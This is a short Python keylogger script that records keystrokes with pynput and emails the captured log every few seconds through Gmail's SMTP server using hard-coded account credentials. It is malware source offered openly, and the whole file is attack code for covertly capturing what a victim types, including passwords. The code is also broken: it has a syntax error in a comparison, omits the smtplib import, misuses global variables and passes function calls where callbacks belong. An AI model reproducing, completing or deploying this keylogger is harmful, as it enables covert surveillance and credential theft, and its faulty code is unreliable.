import pynput.keyboard, threading

email = ''
password = ''

log = 'Keylogger started'

def processKeyPress(key):
    try:
        log = log + str(key.char)
    except AttributeError:
        if key = key.space:
            log = log + ' '
        else:
            log = log + ' ' + str(key) + ' '
def report():
    sendMail(email, password, log)
    log = ''
    timer = threading.Timer(5, report())
    timer.start()
def sendMail(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
keyboardListener = pynput.keyboard.Listener(on_press = processKeyPress())

with keyboardListener:
    report()
    keyboardListener.join()
